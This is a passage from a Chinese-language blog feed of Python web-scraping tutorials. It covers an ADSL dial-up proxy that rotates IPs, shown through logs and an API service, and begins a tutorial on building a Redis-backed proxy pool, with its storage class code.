dial<span class="built_in">..</span>.</span><br><span class="line">2021-07-11 15:30:03.063 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:99 - Dial started, <span class="builtin-name">remove</span> proxy</span><br><span class="line">2021-07-11 15:30:03.063 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:remove_proxy:62 - Removing adsl1<span class="built_in">..</span>.</span><br><span class="line">2021-07-11 15:30:04.065 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:remove_proxy:69 - Removed adsl1 successfully</span><br><span class="line">2021-07-11 15:30:05.373 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:111 - <span class="builtin-name">Get</span> new<span class="built_in"> IP </span>106.45.105.33</span><br><span class="line">2021-07-11 15:30:15.552 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:120 - Valid<span class="built_in"> proxy </span>106.45.105.33:3328</span><br><span class="line">2021-07-11 15:30:16.501 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:set_proxy:82 - Successfully <span class="builtin-name">set</span><span class="built_in"> proxy </span>106.45.105.33:3328</span><br><span class="line">2021-07-11 15:33:36.678 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:loop:90 - Starting dial<span class="built_in">..</span>.</span><br><span class="line">2021-07-11 15:33:36.679 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:99 - Dial started, <span class="builtin-name">remove</span> proxy</span><br><span class="line">2021-07-11 15:33:36.680 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:remove_proxy:62 - Removing adsl1<span class="built_in">..</span>.</span><br><span class="line">2021-07-11 15:33:37.214 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:remove_proxy:69 - Removed adsl1 successfully</span><br><span class="line">2021-07-11 15:33:38.617 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:111 - <span class="builtin-name">Get</span> new<span class="built_in"> IP </span>106.45.105.219</span><br><span class="line">2021-07-11 15:33:48.750 | <span class="builtin-name">INFO</span>     | adslproxy.sender.sender:run:120 - Valid<span class="built_in"> proxy </span>106.45.105.219:3328</span><br><span class="line"><span class="built_in">..</span>.</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们就可以看到，因为云主机在拨号之后当前代理就会失效了，所以在拨号之前程序先尝试从 Redis 中删除当前云主机的代理。接下来就开始执行拨号操作，拨号成功之后验证一下代理是可用的，然后再将该代理存储到 Redis 数据库中。循环往复运行，我们就达到了定时更换 IP 的效果，同时 Redis 数据库中也是实时可用的代理。</p><p>最后按照同样的配置，我们可以购买多台拨号云主机并进行如上同样的设置，这样就有多个稳定的定时更新的代理可用了，Redis 中会实时更新各台云主机的代理，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/yzu81.jpg" alt=""></p><p>图中所示是四台 ADSL 拨号云主机配置并运行后 Redis 数据库中的内容，其中的代理都是实时可用的。</p><h2 id="6-使用代理"><a href="#6-使用代理" class="headerlink" title="6. 使用代理"></a>6. 使用代理</h2><p>那怎么使用代理呢？我们可以在任意可以公网访问的云主机上连接刚才的 Redis 数据库并搭建一个 API 服务即可。怎么搭建呢？我们可以同样使用刚才的 adslproxy 库，该库也提供了 API 服务的功能。</p><p>为了方便测试，我们在本机进行测试，安装好 adslproxy 包之后，然后设置好 REDIS 相关的环境变量：</p><figure class="highlight routeros">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_HOST</span>=&lt;Redis数据库的地址&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_PORT</span>=&lt;Redis数据库的端口&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_PASSWORD</span>=&lt;Redis数据库的密码&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>然后运行如下命令启动即可：</p><figure class="highlight angelscript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="number">2020</span><span class="number">-07</span><span class="number">-11</span> <span class="number">16</span>:<span class="number">31</span>:<span class="number">58.651</span> | INFO     | adslproxy.server.server:serve:<span class="number">68</span> - API listening on http:<span class="comment">//0.0.0.0:8425</span></span><br></pre>      </td>    </tr>  </table></figure><p>可以看到 API 服务就在 8425 端口上运行了，我们打开浏览器即可访问首页，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/1j4aq.png" alt="image-20210711153319974"></p><p>其中最重要的就是 random 接口了，我们使用 random 接口即可获取 Redis 数据库中的一个随机代理，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/9ogwc.png" alt="image-20210711153419543"></p><p>测试下可用性也没有问题，这样爬虫就可以使用这个代理来进行数据爬取了。</p><p>最后，我们将 API 服务部署一下，这个 ADSL 代理服务就可以像代理池一样被使用了，每请求一次 API 就可以获取一个实时可用代理，不同的时间段这个代理就会实时更换，而且连接稳定速度又快，实在是网络爬虫的最佳搭档。</p><h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>本节我们介绍了 ADSL 拨号代理的搭建过程。通过这种代理，我们可以无限次更换 IP，而且线路非常稳定，爬虫抓取效果也会好很多。</p><p>本节代码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvQWRzbFByb3h5">https://github.com/Python3WebSpider/AdslProxy<i class="fa fa-external-link-alt"></i></span>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 202
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="ADSL" scheme="https://cuiqingcai.com/tags/ADSL/"/>
    
      <category term="代理" scheme="https://cuiqingcai.com/tags/%E4%BB%A3%E7%90%86/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - 高效代理池的维护</title>
    <link href="https://cuiqingcai.com/2022103.html"/>
    <id>https://cuiqingcai.com/2022103.html</id>
    <published>2022-03-04T05:11:13.000Z</published>
    <updated>2022-08-01T15:41:25.996Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>我们在上一节中了解了各个请求库设置代理的各个方法，但是如何实时高效地获取到大量可用的代理是一个问题。</p><p>首先，在互联网上有大量公开的免费代理。当然，我们也可以购买付费的代理 IP，但是代理不论是免费的还是付费的，都不能保证是可用的，因为此 IP 可能被其他人用来爬取同样的目标站点而被封禁，或者代理服务器突然发生故障或网络繁忙。一旦我们选用了一个不可用的代理，这势必会影响爬虫的工作效率。</p><p>所以，我们需要提前做筛选，将不可用的代理剔除掉，保留可用代理。</p><p>那么，怎么实现呢？这就需要借助于一个叫作代理池的东西了。</p><p>接下来，本节就来介绍一下如何搭建一个高效易用的代理池。</p><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>这里代理池的存储需要借助于 Redis，因此需要额外安装它。总体来说，本节需要的环境如下：</p><ul>  <li>    <p>需要安装并成功运行和连接一个 Redis 数据库，Redis 运行在本地或者远端服务器都可以，只要能正常连接就行，安装方式可以参考：<span class="exturl" data-url="aHR0cHM6Ly9zZXR1cC5zY3JhcGUuY2VudGVyL3JlZGlz">https://setup.scrape.center/redis<i class="fa fa-external-link-alt"></i></span></p>  </li>  <li>    <p>安装好一些必要的库，包括 aiohttp、requests、redis-py、pyquery、Flask、loguru 等，安装命令如下：</p>    <figure class="highlight cmake">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br></pre>          </td>          <td class="code">            <pre><span class="line">pip3 <span class="keyword">install</span> aiohttp requests redis pyquery flask loguru</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><p>做好了如上准备工作，我们便可以开始实现或运行本节所讲的代理池了。</p><h2 id="2-代理池的目标"><a href="#2-代理池的目标" class="headerlink" title="2.代理池的目标"></a>2.代理池的目标</h2><p>我们需要做到下面几个目标来实现易用高效的代理池。</p><p>代理池基本模块分为 4 部分：存储模块、获取模块、检测模块和接口模块，其功能如下：</p><ul>  <li><strong>存储模块</strong>：负责存储抓取下来的代理。首先要保证代理不重复，要标识代理的可用情况，还要动态实时处理每个代理，所以一种比较高效和方便的存储方式就是使用 Redis 的 Sorted Set，即有序集合。</li>  <li><strong>获取模块</strong>：需要定时在各大代理网站抓取代理。代理既可以是免费公开代理，也可以是付费代理，代理的形式都是 IP 加端口。此模块尽量从不同来源获取，尽量抓取高匿代理，抓取成功之后将可用代理保存到数据库中。</li>  <li><strong>检测模块</strong>：需要定时检测数据库中的代理。这里需要设置一个检测链接，最好是爬取哪个网站就检测哪个网站，这样更加有针对性。如果要做一个通用型的代理，可以设置百度等链接来检测。另外，我们需要标识每一个代理的状态，如设置分数标识，100 分代表可用，分数越少代表越不可用。检测一次，如果代理可用，我们可以将分数标识立即设置为 100 满分，也可以在原基础上加 1 分；如果代理不可用，可以将分数标识减 1 分，当分数减到一定阈值后，代理就直接从数据库移除。通过这样标识分数，我们就可以辨别代理的可用情况，选用的时候会更有针对性。</li>  <li><strong>接口模块</strong>：需要用 API 来提供对外服务的接口。其实我们可以直接连接数据库来取对应的数据，但是这样就需要知道数据库的连接信息，并且要配置连接，而比较安全和方便的方式就是提供一个 Web API 接口，我们通过访问接口即可拿到可用代理。另外，由于可用代理可能有多个，所以我们可以设置一个随机返回某个可用代理的接口，这样就能保证每个可用代理都可以取到，实现负载均衡。</li></ul><p>以上内容是设计代理的一些基本思路。接下来，我们设计整体的架构，然后用代码实现代理池。</p><h2 id="3-代理池的架构"><a href="#3-代理池的架构" class="headerlink" title="3. 代理池的架构"></a>3. 代理池的架构</h2><p>根据上文的描述，代理池的架构如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/v0xz8.jpg" alt=""></p><p>图中所示的代理池分为 4 个模块：存储模块、获取模块、检测模块和接口模块：</p><ul>  <li>存储模块使用 Redis 的有序集合，用来做代理的去重和状态标识，同时它也是中心模块和基础模块，用于将其他模块串联起来。</li>  <li>获取模块定时从代理网站获取代理，将获取的代理传递给存储模块，并保存到数据库。</li>  <li>检测模块定时通过存储模块获取所有代理，并对代理进行检测，根据不同的检测结果对代理设置不同的标识。</li>  <li>接口模块通过 Web API 提供服务接口，接口通过连接数据库并通过 Web 形式返回可用的代理。</li></ul><h2 id="4-代理池的实现"><a href="#4-代理池的实现" class="headerlink" title="4.代理池的实现"></a>4.代理池的实现</h2><p>接下来，我们分别用代码来实现一下这 4 个模块。</p><blockquote>  <p>注意：完整的代理池代码量较大，因此本节的代码我们不再一步步跟着编写，最后去了解源码即可，源码地址为：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvUHJveHlQb29s">https://github.com/Python3WebSpider/ProxyPool<i class="fa fa-external-link-alt"></i></span></p></blockquote><h3 id="存储模块"><a href="#存储模块" class="headerlink" title="存储模块"></a>存储模块</h3><p>这里我们使用 Redis 的有序集合，集合中的每一个元素都是不重复的。对于代理池来说，集合中的元素就变成了一个个代理，也就是 IP 加端口的形式，如 <code>60.207.237.111:8888</code>。另外，有序集合的每一个元素都有一个分数字段，分数是可以重复的，既可以是浮点数类型，也可以是整数类型。该集合会根据每一个元素的分数对集合进行排序，数值小的排在前面，数值大的排在后面，这样就可以实现集合元素的排序了。</p><p>对于代理池来说，这个分数可以作为判断一个代理是否可用的标志：100 为最高分，代表最可用；0 为最低分，代表最不可用。如果要获取可用代理，可以从代理池中随机获取分数最高的代理。注意这里是随机，这样可以保证每个可用代理都会被调用到。</p><p>分数是我们判断代理稳定性的重要标准。设置分数的规则如下所示。</p><ul>  <li>分数 100 为可用，检测器会定时循环检测每个代理的可用情况。一旦检测到有可用的代理，就立即置为 100；如果检测到不可用，就将分数减 1，分数减至 0 后代理移除。</li>  <li>新获取的代理的分数为 10，如果测试可行，分数立即置为 100，不可行则将分数减 1，分数减至 0 后代理移除。</li></ul><p>这只是一种解决方案，当然可能还有更合理的方案。之所以设置此方案，有如下几个原因。</p><ul>  <li>在检测到代理可用时，分数立即置为 100，这样可以保证所有可用代理有更大的机会被获取到。你可能会问，为什么不将分数加 1 而是直接将其设为最高值 100 呢？设想一下，有的代理是从各大免费公开代理网站获取的，常常一个代理并没有那么稳定，平均 5 次请求可能有 2 次成功，3 次失败。如果按照这种方式来设置分数，那么这个代理几乎不可能达到一个高的分数，也就是说即便它有时是可用的，但是筛选的分数最高，那这样的代理几乎不可能被取到。如果想追求代理稳定性，可以用上述方法，这种方法可确保分数最高的代理一定是最稳定可用的。所以，这里我们采取 “可用即设置 100” 的方法，确保只要可用的代理都可以被获取到。</li>  <li>在检测到代理不可用时，分数减 1，分数减至 0 后，代理移除。这样一个有效代理如果被移除，需要连续不断失败 100 次。也就是说，当一个可用代理尝试了 100 次都失败了，就一直减分直到移除，一旦成功，就重新置回 100。尝试机会越多，这个代理拯救回来的机会越多，这样就不容易将曾经的一个可用代理丢弃，因为代理不可用的原因很可能是网络繁忙或者其他人用此代理请求太过频繁，所以这里将分数设为 100。</li>  <li>将新获取的代理的分数设置为 10，如果它不可用，分数就减 1，直到减到 0 就移除；如果代理可用，分数就置为 100。由于很多代理是从免费网站获取的，所以新获取的代理无效的比例非常高，可能可用的代理不足 10%。这里我们将分数设置为 10，检测的机会没有可用代理的 100 次那么多，这也可以适当减少开销。</li></ul><p>上述代理分数的设置思路不一定是最优思路，但据个人实测，它的实用性还是比较强的。</p><p>这里首先给出存储模块的实现代码，见 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvUHJveHlQb29sL3RyZWUvbWFzdGVyL3Byb3h5cG9vbC9zdG9yYWdlc++8jOW7uuiuruebtOaOpeWvueeFp+a6kOeggemYheivu+OAgg==">https://github.com/Python3WebSpider/ProxyPool/tree/master/proxypool/storages，建议直接对照源码阅读。<i class="fa fa-external-link-alt"></i></span></p><p>在代码中，我们定义了一个类来操作数据库的有序集合，定义了一些方法来实现分数的设置、代理的获取等。其核心实现代码如下所示：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> proxypool.exceptions <span class="keyword">import</span> PoolEmptyException</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas.proxy <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> REDIS_HOST, REDIS_PORT, REDIS_PASSWORD, REDIS_KEY, PROXY_SCORE_MAX, PROXY_SCORE_MIN, \</span><br><span class="line">    PROXY_SCORE_INIT</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> proxypool.utils.proxy <span class="keyword">import</span> is_valid_proxy, convert_proxy_or_proxies</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REDIS_CLIENT_VERSION = redis.__version__</span><br><span class="line">IS_REDIS_VERSION_2 = REDIS_CLIENT_VERSION.startswith(<span class="string">'2.'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisClient</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    redis connection client of proxypool</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PASSWORD, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        init redis client</span></span><br><span class="line"><span class="string">        :param host: redis host</span></span><br><span class="line"><span class="string">        :param port: redis port</span></span><br><span class="line"><span class="string">        :param password: redis password</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.db = redis.StrictRedis(host=host, port=port, password=password, decode_responses=<span class="literal">True</span>, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, proxy: Proxy, score=PROXY_SCORE_INIT)</span> -&gt; int:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        add proxy and set it to init score</span></span><br><span class="line"><span class="string">        :param proxy: proxy, ip:port, like 8.8.8.8:88</span></span><br><span class="line"><span class="string">        :param score: int score</span></span><br><span class="line"><span class="string">        :return: result</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_proxy(<span class="string">f'<span class="subst">&#123;proxy.host&#125;</span>:<span class="subst">&#123;proxy.port&#125;</span>'</span>):</span><br><span class="line">            logger.info(<span class="string">f'invalid proxy <span class="subst">&#123;proxy&#125;</span>, throw it'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.exists(proxy):</span><br><span class="line">            <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">                <span class="keyword">return</span> self.db.zadd(REDIS_KEY, score, proxy.string())</span><br><span class="line">            <span class="keyword">return</span> self.db.zadd(REDIS_KEY, &#123;proxy.string(): score&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">random</span><span class="params">(self)</span> -&gt; Proxy:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        get random proxy</span></span><br><span class="line"><span class="string">        firstly try to get proxy with max score</span></span><br><span class="line"><span class="string">        if not exists, try to get proxy by rank</span></span><br><span class="line"><span class="string">        if not exists, raise error</span></span><br><span class="line"><span class="string">        :return: proxy, like 8.8.8.8:8</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># try to get proxy with max score</span></span><br><span class="line">        proxies = self.db.zrangebyscore(REDIS_KEY, PROXY_SCORE_MAX, PROXY_SCORE_MAX)</span><br><span class="line">        <span class="keyword">if</span> len(proxies):</span><br><span class="line">            <span class="keyword">return</span> convert_proxy_or_proxies(choice(proxies))</span><br><span class="line">        <span class="comment"># else get proxy by rank</span></span><br><span class="line">        proxies = self.db.zrevrange(REDIS_KEY, PROXY_SCORE_MIN, PROXY_SCORE_MAX)</span><br><span class="line">        <span class="keyword">if</span> len(proxies):</span><br><span class="line">            <span class="keyword">return</span> convert_proxy_or_proxies(choice(proxies))</span><br><span class="line">        <span class="comment"># else raise error</span></span><br><span class="line">        <span class="keyword">raise</span> PoolEmptyException</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrease</span><span class="params">(self, proxy: Proxy)</span> -&gt; int:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        decrease score of proxy, if small than PROXY_SCORE_MIN, delete it</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: new score</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        score = self.db.zscore(REDIS_KEY, proxy.string())</span><br><span class="line">        <span class="comment"># current score is larger than PROXY_SCORE_MIN</span></span><br><span class="line">        <span class="keyword">if</span> score <span class="keyword">and</span> score &gt; PROXY_SCORE_MIN:</span><br><span class="line">            logger.info(<span class="string">f'<span class="subst">&#123;proxy.string()&#125;</span> current score <span class="subst">&#123;score&#125;</span>, decrease 1'</span>)</span><br><span class="line">            <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">                <span class="keyword">return</span> self.db.zincrby(REDIS_KEY, proxy.string(), <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> self.db.zincrby(REDIS_KEY, <span class="number">-1</span>, proxy.string())</span><br><span class="line">        <span class="comment"># otherwise delete proxy</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.info(<span class="string">f'<span class="subst">&#123;proxy.string()&#125;</span> current score <span class="subst">&#123;score&#125;</span>, remove'</span>)</span><br><span class="line">            <span class="keyword">return</span> self.db.zrem(REDIS_KEY, proxy.string())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exists</span><span class="params">(self, proxy: Proxy)</span> -&gt; bool:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        if proxy exists</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: if exists, bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> self.db.zscore(REDIS_KEY, proxy.string()) <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">max</span><span class="params">(self, proxy: Proxy)</span> -&gt; int:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        set proxy to max score</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: new score</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        logger.info(<span class="string">f'<span class="subst">&#123;proxy.string()&#125;</span> is valid, set to <span class="subst">&#123;PROXY_SCORE_MAX&#125;</span>'</span>)</span><br><span class="line">        <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">            <span class="keyword">return</span> self.db.zadd(REDIS_KEY, PROXY_SCORE_MAX, proxy.string())</span><br><span class="line">        <span class="keyword">return</span> self.db.zadd(REDIS_KEY, &#123;proxy.string(): PROXY_SCORE_MAX&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(self)</span> -&gt; int:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        get count of proxies</span></span><br><span class="line"><span class="string">        :return: count, int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> self.db.zcard(REDIS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">all</span><span class="params">(self)</span> -&gt; List[Proxy]:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        get all proxies</span></span><br><span class="line"><span class="string">        :return: list of proxies</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> convert_proxy_or_proxies(self.db.zrangebyscore(REDIS_KEY, PROXY_SCORE_MIN, PROXY_SCORE_MAX))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">batch</span><span class="params">(self, start, end)</span> -&gt; List[Proxy]:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        get batch of proxies</span></span><br><span class="line"><span class="string">        :param start: start index</span></span><br><span class="line"><span class="string">        :param end: end index</span></span><br><span class="line"><span class="string">        :return: list of proxies</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> convert_proxy_or_proxies(self.db.zrevrange(REDIS_KEY, start, end - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    conn = RedisClient()</span><br><span class="line">    result = conn.random()</span><br><span class="line">    print(result)</span><br></pre>      </td>    </tr>  </table></figure><p>首先，我们定义了一些常量，如 <code>PROXY_SCORE_MAX</code>、<code>PROXY_SCORE_MIN</code>、<code>PROXY_SCORE_INIT</code> 分别代表最大分数、最小分数、初始分数。<code>REDIS_HOST</code>、<code>REDIS_PORT</code>、<code>REDIS_PASSWORD</code> 分别代表了 Redis 的连接信息，即地址、端口和密码。<code>REDIS_KEY</code> 是有序集合的键名，我们可以通过它来获取代理存储所使用的有序集合。</p><p><code>RedisClient</code> 这个类可以用来操作 Redis 的有序集合，其中定义了一些方法来对集合中的元素进行处理，它的主要功能如下所示。</p><ul>  <li><code>__init__</code> 方法是初始化的方法，其参数是 Redis 的连接信息，默认的连接信息已经定义为常量。我们在 <code>__init__</code> 方法中初始化了 <code>StrictRedis</code> 类，建立了 Redis 连接。</li>  <li><code>add</code> 方法用于向数据库添加代理并设置分数，默认的分数是 <code>PROXY_SCORE_INIT</code>，也就是 10，返回结果是添加的结果。</li>  <li><code>random</code> 方法是随机获取代理的方法。首先获取 100 分的代理，然后随机选择一个返回。如果不存在 100 分的代理，则此方法按照排名来获取，选取前 100 名，然后随机选择一个返回，否则抛出异常。</li>  <li><code>decrease</code> 方法是在代理检测无效的时候设置分数减 1 的方法，代理传入后，此方法将代理的分数减 1，如果分数达到最低值，那么代理就删除。</li>  <li><code>exists</code> 方法用于判断代理是否存在集合中。</li>  <li><code>max</code> 方法用于将代理的分数设置为 <code>PROXY_SCORE_MAX</code>，即 100，也就是代理有效时的设置。</li>  <li><code>count</code> 方法用于返回当前集合的元素个数。</li>  <li><code>all</code> 方法返回所有的代理列表，供检测使用。</li></ul><p>定义好这些方法后，我们可以在后续的模块中调用此类来连接和操作数据库。如果要获取随机可用的代理，只需要调用 <code>random</code> 方法即可，得到的就是随机的可用代理。</p><h3 id="获取模块"><a href="#获取模块" class="headerlink" 